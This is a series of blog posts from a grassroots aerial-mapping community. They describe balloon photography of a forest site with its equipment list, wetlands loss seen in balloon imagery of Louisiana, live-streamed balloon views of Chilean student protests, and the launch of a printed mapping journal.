<p><a rel="attachment wp-att-983" href="/2011/09/trees-chainsaws-protest-and-balloons/4-point-10-each/"><img class="aligncenter size-medium wp-image-983" title="4 point 10 each" src="/wp-content/uploads/2011/09/4-point-10-each-300x225.jpg" alt="" width="300" height="225" srcset="/wp-content/uploads/2011/09/4-point-10-each-300x225.jpg 300w, /wp-content/uploads/2011/09/4-point-10-each-1024x768.jpg 1024w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>We are also currently launching a <a href="http://sumava.watching.cz/">Ushahidi based platform</a> (note that this is still a site concept) as a space for gathering all available imagery and testimonies in order to provide a repository for any future reference and planning. Next time, we need to act faster and deploy during the operation, not only after it.</p>
<p><b>Our key lesson learned while mapping:</b></p>
<p>While mapping in difficult to access environments, you need to be ready and well prepared: two cameras and enough balloons (note – dogs hate inflating of the balloons) are essential. We plan to try to use kites next time as well. But the bottom line is: Don’t give up!</p>
<p><b>A list of equipment used for this project:</b></p>
<p>&#8211; Camera Canon Powershot A495 &#8211; cheap, but little bit too heavy. Need to crack the firmware in order to enable unlimited continuous shooting.<br />
&#8211; SD card – max 2GB SD card enabled the crack for continuous shooting to work, set up 1 image per 3 seconds (the capacity of 2 GB SD card was just enough for some 20-30 minutes of ballooning). Some one third of pictures was sharp enough which was sufficient.<br />
&#8211; 5l helium bottle (just enough for one ballooning session)<br />
&#8211; 2 party balloons 160cm size, one 90 cm size (at least another three as a backup).<br />
&#8211; Light string 150 meters (wish we had more)<br />
&#8211; Plastic bottle as a cover<br />
&#8211; Laptop<br />
&#8211; Tons of AA back-up batteries</p>

<p>I&#8217;ve heard Shannon Dosemagen cite &#8220;a football field of wetlands loss every 30 minutes&#8221; along the Louisiana gulf coast, due to lower freshwater inflow/silt deposition, contamination, wake, and other issues. I was working on a map of balloon images of Bayou St. Denis recently and compared our imagery to that of Bing, which is a few years old. I believe these are pretty well lined up, based on the stream intersections, and you can clearly see the amount of land missing in the more recent images. </p>

<p>I wonder how old the Bing imagery is. Google has stuff from a few weeks after the oil spill. Though it&#8217;s difficult to align these datasets given that the land itself is changing shape, the high resolution of the images that grassroots mappers captured makes it an interesting way to quantify wetlands loss. Hopefully our ongoing collaboration with Louisiana Universities Marine Consortium (LUMCON) will yield even more data for this area.</p>
<p>Compared to the Google Maps vector coastlines, there&#8217;s been even more loss; presumably these aren&#8217;t updated every time new satellite data is available:</p>

<p>The recent months of 2011 have marked the manifestation of student frustration with the Chilean education system. Hundreds of thousands of university and secondary students have flooded the streets of Santiago and other cities across Chile, in a series of protests demanding: lower tuition, more opportunities to access public universities, better quality education, and increased government spending on education, including more scholarships for lower class students.</p>
<p>The Chilean government spends less on education than most developed countries: 4.4% of its GDP, compared to the average 7%, which means a good portion of Chilean students pay for their own university education. With the combination of being one of the most socially stratified countries in the world, (40% of the country’s wealth is concentrated in 10% of the population), and the high costs of education, many students do not have the ability to attend a quality university. The Piñera administration and the leading group of Chilean students, along with their supporters have been at odds with each other for the last few months, struggling on the debate of education policy reform. Unable to agree upon a solution, the result has been the eruption of student protests across the country.</p>
<p>These protests have been covered by media outlets worldwide, often featuring negative images of the few individuals who cause trouble. Most media attention focuses on people fighting with each other, and with the police, showing the resulting arrests and damage to public property. While this is one characteristic of the protests, there is another side of the story that isn’t always covered by the media. That side is of the great majority of the participants in the protest; the individual citizen, who is marching peacefully to show their concern for the issue at hand.  As an organization, we do not take sides on political issues of this nature, however, we support a citizen’s right to express their content or discontent with their government. In this context, and for the purpose of encouraging civic engagement through information technology, Fundación Ciudadano Inteligente, (Smart Citizen Foundation, http://www.votainteligente.cl/) along with Public Laboratory, adapted the idea of balloon mapping to our own needs. We wanted to demonstrate and strengthen the perspective of viewing protests from the citizen’s point of view, in order to broadcast to the world the majority, rather than the minority of the behavior of the attendees these events. We wanted to show a grassroots movement from a truly grassroots perspective.</p>

The objective was to cover the student protests in a way that was inexpensive, and easily replicable by almost anyone. The materials were simple: an iPhone 3G connected to the internet, string, helium, and balloons. We used a string to connect the camera phone and balloons, which were elevated to approximately 20 feet in the air, and controlled by a member of our team. The phone was connected to the internet, which allowed us to live stream the protest on our website. In only two hours, we had an incredible following; over 10,000 people viewed the protest live from our site, and Fundación Ciudadano Inteligente’s twitter account had thousands of hits and comments. This far exceeded the number of daily visits that we have on our website and showed the impact that this project could really have.</p>
<p>Approximately one week later, in preparation for the next round student protests, Fundación Ciudadano Inteligente translated the Public Laboratory’s Guide to Balloon Mapping into Spanish. We uploaded it onto our website, (<a href="http://www.ciudadanointeligente.cl/marcha/armatuglobo.html">http://www.ciudadanointeligente.cl/marcha/armatuglobo.html</a>) as well as handed it out to demonstrators at the protest. We wanted to encourage Chilean citizens to construct their own balloon map, allowing them to show their own point of view of the protests. The reception to this idea was very positive and people were excited to realize that they could broadcast their own aerial view of the protest, with any webcam, or camera connected to the internet.</p>

<p>This new idea also captured the attention of the media. Within the two weeks of live streaming the event, Ciudadano Inteligente was featured on Teletrece and TVN, both Chilean news stations that broadcast nationwide. We also had several radio station interviews on the topic. Much to the credit of the incredible citizen and media reception of this project, this site is now an extension of Fundación Cuidadano Inteligente, (<a href="http://www.ciudadanointeligente.cl/marcha/">http://www.ciudadanointeligente.cl/marcha/</a>) that we hope to use to live stream future protests.</p>
<p>We live in a world where connectivity is immediate and the potential for video virility is one tweet, or one post away. In the instance of balloon mapping protests, the fact that any handheld webcam, or phone with internet connection can be used to capture protests live, allows for the potential of thousands of views, and thus increasing the power of individual self expression and citizen engagement. Now ordinary people don’t necessarily have to rely solely on media broadcasting for coverage of a protest. This enables them not only to see the peaceful activity of the majority of the demonstration participants, but to show their own version of it to the world. This use of global mapping can truly put the power of the dispersion of visual information in the hands of everyday people, the majority of people, to show the positive and peaceful side of grassroots movements as they are happening.</p>

We hope that because of the nature of the feasibility of construction of the Balloon Mapping, for these purposes, more people will construct their own in the future. All of this can be done with easily accessible materials that almost anyone, almost anywhere, can find, allowing for the transformation of the perception of protests; from a literal top down, to bottom up, approach.</p>
<p>In future demonstrations, we hope to look up and see a rainbow of balloons dotting the sky!</p>

<p>Hello mappers etc!</p>
<p>We&#8217;ve just launched the first issue of the &#8220;Grassroots Mapping Forum&#8221;, our new community research journal/archive/zine/map, where we hope to share ideas, techniques, and stories from the Grassroots Mapping community. (For those of you who don&#8217;t know, we are a community of activist cartographers who use DIY tools for civic science &#8212; we take aerial photos using kites and balloons of things like the BP oil spill.)</p>
<p>The front of every issue, which is essentially a giant printed map, will depict a Grassroots Mapping site &#8212; the first one is of an island in Wilkinson Bay, Louisiana, with oil residue along a wetlands coastline.  It is printed on a single 22.75&#215;35&#8243; sheet, folded down to just over letter size, and includes a full color reproduction of a grassroots map along with essays, illustrated guides, and interviews on the reverse.</p>
<p>You can find out more, and purchase the first issue here for $17 shipped:<br />

<p>If you&#8217;re interested in supporting <a href="http://publiclaboratory.org">Public Laboratory&#8217;s</a> work, consider buying 3 or 4 and giving them to your friends.</p>
<p>The first issue of the Grassoots Mapping Forum was sponsored by <a href="http://developmentseed.com">DevelopmentSeed</a>, creators of <a href="http://mapbox.com">MapBox</a>, and we are looking for sponsors for future maps. If you&#8217;re interested, please get in touch.</p>
